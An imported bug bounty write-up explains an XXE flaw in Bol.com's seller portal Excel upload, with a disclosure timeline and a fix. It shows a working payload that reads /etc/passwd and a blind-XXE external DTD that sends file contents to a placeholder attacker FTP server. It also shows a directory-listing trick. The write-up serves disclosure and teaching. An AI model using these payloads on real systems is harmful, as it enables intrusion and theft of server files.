---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-11_xxe-at-bolcom.md
original_filename: 2018-09-11_xxe-at-bolcom.md
title: XXE at Bol.com
category: documents
detected_topics:
- xss
- ssrf
- command-injection
- path-traversal
- mobile-security
- sso
tags:
- imported
- documents
- xss
- ssrf
- command-injection
- path-traversal
- mobile-security
- sso
language: en
raw_sha256: 609d83e62755e615ba80e04817ed58013139daf07179db46d495a4d697f23a9d
text_sha256: 0ec45875ccc790008f76c771ad92f122ba9d17b6b30a5e77de9a8118e288680e
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# XXE at Bol.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-11_xxe-at-bolcom.md
- Source Type: markdown
- Detected Topics: xss, ssrf, command-injection, path-traversal, mobile-security, sso
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `609d83e62755e615ba80e04817ed58013139daf07179db46d495a4d697f23a9d`
- Text SHA256: `0ec45875ccc790008f76c771ad92f122ba9d17b6b30a5e77de9a8118e288680e`


## Content

---
title: "XXE at Bol.com"
url: "https://medium.com/@jonathanbouman/xxe-at-bol-com-7d331186de54"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["Bol.com"]
bugs: ["XXE"]
bounty: "500"
publication_date: "2018-09-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5706
scraped_via: "browseros"
---

# XXE at Bol.com

Top highlight

XXE at Bol.com
Jonathan Bouman
Follow
8 min read
·
Sep 12, 2018

900

4

Press enter or click to view image in full size
Proof of concept (contents of the server file /etc/passwd are loaded into the offer description field)

Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl

Background
In the previous reports we learned more about executing code in the browser of a visitor; reflected XSS and stored XSS. Furthermore we had a quick look at misconfigured server settings and open redirects.

Today we will take a closer look at stealing private files from a server.

Picking a target
As always we need to have a good target. One of the biggest ecommerce websites in the Netherlands is Bol.com. The way they handled my open redirect bug report was really good; fast replies, a proper fix and sending me updates all the time. No hassles, no NDA’s, happy tone of voice. A perfect example of how companies should be dealing with responsible disclosures. A company you want to be part of.

Before we start we first need to learn something more about XXE, LFI and RCE. After that we are ready to go!

XXE, LFI, RCE; what is in the name?
Local File Inclusion (LFI) is the process of displaying internal server files in the server response. Remote Code Execution (RCE) is the process of executing our own code on a server.

Often a LFI bug leads to RCE; there a plenty of tricks you can use to escalate LFI to RCE (pay close attention to the credits, some really good reads).

RCE bugs have a high impact since it could lead to a complete server take-over. Although most servers execute code coming from the web server under a account with limited access, every now and then flaws are found in operating systems themselves. Flaws that allow one to bypass this specific access limitation. You may have used this type of bug yourself in the past; by jailbreaking iOS on your iPhone or rooting your Android phone. Both perfect examples of taking over a operating system by exploiting a bug. We call this type of attack privilege escalation.

XML External Entity (XXE) attacks are based on extending an XML file so it loads local files and external URLs. It may lead to LFI and RCE so it has a high impact. Although discovered in 2002, it is still a bug you will find in plenty of websites these days. High impact and high incidence, lets learn more about it!

Extensible Markup Language (XML)
Before we proceed we need to know a little bit more about XML. XML is a markup language that allows one to create documents that are supposed to be easy to read by computers and humans. Although some say it is a language of the past, it’s still used in many places these days.

Example of a XML file

If we take a close look at the example we will notice that the contents will appear in between a tag, <body>contents</body> for example. Due to that we should escape specific characters inside the tag. Otherwise one is able to inject a tag and manipulate the whole XML file, nobody wants that. By default XML escapes the <>&'" characters into entities like &lt;&gt;&amp;&apos;&quot;. Due to that we are still able to use the characters without breaking the XML file.

Example of a custom entity
The Chrome XML parser will replace the &body; entity with our defined string

XML got a nice feature that allows us to define our own entities by including a Document type definition (DTD) in the XML document. See the example images.

Example DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY body "Don't forget me this weekend!" >
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body><r>&body;</r></body>
</note>

Exploiting the XML parser
But what if a parser allows us to define a file instead of a string? The result will be that the entity will be replaced by the contents of a file. By changing <!ENTITY body "Don't forget me this weekend!" > into <!ENTITY body SYSTEM "file:///etc/passwd" > some parsers will display us the contents of the /etc/passwd file.

Besides LFI some XML parsers also allow us to load external URLs; just replace the file:// string with a http:// URL. The webserver will request this URL. This may result in attacks called Server Side Request Forgery; you are able to request internal webservers, scan for open ports and map the internal network. Are you able to access local webservers holding meta data? Congratulations, you may end up with a $25.000 bounty.

Other possibilities are direct RCE through PHP modules and denial of service attacks.

The LFI attack described above is only feasible if our input is returned somewhere. Otherwise we can’t read the replaced entity. If you ever run into this situation you may use a the following trick to leak the data.

Blind XXE? Leak data by requesting an external DTD over HTTP/FTP
So the server does parse your XML, but does not show you the contents in the response?

Since you are able to load external DTD’s, you may append a custom entity to this external url. As long as the URL is valid it will load the URL with the (file) contents appended to it. Be aware that characters like # will break the url.

XXEserve
A nice tool to capture our XXE requests is XXEserv, created by staaldraad. It is a simple FTP / HTTP server that displays all requests to our server. It also fakes a FTP server; where HTTP sometimes fails due to the characters in the string, FTP just works.

Quick start
1. Install XXEserv on a public facing server
2. Create an external DTD file (i.e. sp2.dtd) that contains the file or (internal) URL you want to leak. Replace the x.x.x.x with the IP address or hostname of your server:
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY body SYSTEM 'ftp://x.x.x.x:21/%d;'>">
3. Put this external DTD file in the XXEserv directory. XXEserv acts as a public ftp and web server; so we are able to link this file now.
4. Send the XML payload to our victim, include our external DTD:
<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE r [
<!ENTITY % a SYSTEM "http://x.x.x.x:80/dtds/sp2.dtd">
%a;
%c;
]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body><r>&body;</r></body>
</note>
5. Watch the output of XXEserv

Example of XXEserv output from another report. Here we leak the RSA public key from the local meta server by loading our external DTD over FTP.

Take a look at this page and this page if you want to see different variations of XXE payloads, get inspired! Got a nice variation that is missing? Please leave a comment below :-)

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Exploring Bol.com
We need to find a way to upload or inject our XML code into Bol.com. A good first step is to take a closer look at the their ‘Seller Portal’. Most of the times sellers are able to upload images or other files relating to their products.

Press enter or click to view image in full size
Bol.com Seller Portal

This part of the website allows one to upload products ready to (re)sell.
A quick lesson Dutch: ‘Aanbod beheren via excel’ means ‘Manage inventory in Excel’.

Press enter or click to view image in full size
The bulk upload interface

There are three steps in this interface:
1. Download an Excel file containing your current inventory
2. Upload the changed Excel file
3. View the results of the upload

Inventory Excel file
The Excel file has the extension XLSX. This is a open file format developed by Microsoft; behind the scenes it’s a zip file containing multiple XML files.

Press enter or click to view image in full size
Example of the Excel file you download from the Seller Portal

Let’s unzip the XLSX.

Press enter or click to view image in full size
XLSX Unzipped
Press enter or click to view image in full size
One of the XML files contains the data of sheet 1

If we open the sheet1.xml we will see the following code.

Press enter or click to view image in full size

Let’s say we want to try to inject the file contents of /etc/passwd into the Offer description (this is cell G4, see the original Excel sheet).

Press enter or click to view image in full size
Cell G4 is selected

As we can see in the image the string ‘Sample description’ is being referred to by the id 108. Let’s add our custom entity to this sheet and replace this cells value with our custom entity.

Press enter or click to view image in full size
Injecting our custom entity

We save the file, zip the folder again and rename the file to xlsx.

Press enter or click to view image in full size
Zip the files and change the extension to .xlsx

Let’s see what happens if we upload the file in step 2, let it load, and download the file again from step 1. If the XXE attack works it would update our Sample Product (row 4 in Excel) and inject the file contents of /etc/passwd into the Offer Description of this product.

Proof of Concept

Press enter or click to view image in full size

It works, time to write a report and inform Bol.com of our findings!

The next step would be to check out if the server is part of some cloud hosting provider that support cloud meta data, check for configuration files containing API keys and see if it is possible to escalate from LFI to RCE.

However the impact is already high so I thought it would be wise to inform Bol.com immediately. I asked them if they want me to check for escalation to RCE. But before they could answer the question the bug was fixed :-)

Bonus #1: Directory listing
The XML parser used by Bol.com returns file names (as one big string) if we try to parse directories instead of files (i.e.<!ENTITY body SYSTEM "file:///etc/">). This allows us to quickly enumerate all the files on the server, no brute force of file names is needed.

Bonus #2: Image upload? Check for XXE!
It is possible to inject XXE payloads in plenty of files. So every image upload is a potential XXE vulnerability. BuffaloWill created an awesome tool that allows you to easily embed a XXE payloads into all those different files. Don’t forget to checkout his talk at Defcon 2015.

Conclusion
By editing a XML file we were able to include the contents of a local server file as a string in our upload. We were able to download this document afterwards, so we were able to read private files from one of their production servers.

Solutions
The best solution is to disable any DTD support in your XML parser. OWASP has a nice overview of different parsers and their configuration.

Impact
- Local file inclusion
- Possible to perform a local denial of service attack (not confirmed, Billion laughs attack)
- Possible RCE (not confirmed)
- Possible SSRF (not confirmed)

Timeline
02–09–18 Discovered bug, informed Bol.com
03–09–18 Bol.com confirmed the bug
04–09–18 Bol.com deployed fix, rewarded €500 Bol.com voucher
08–09–18 Wrote this blog, informed Bol.com
11–09–18 Published this blog
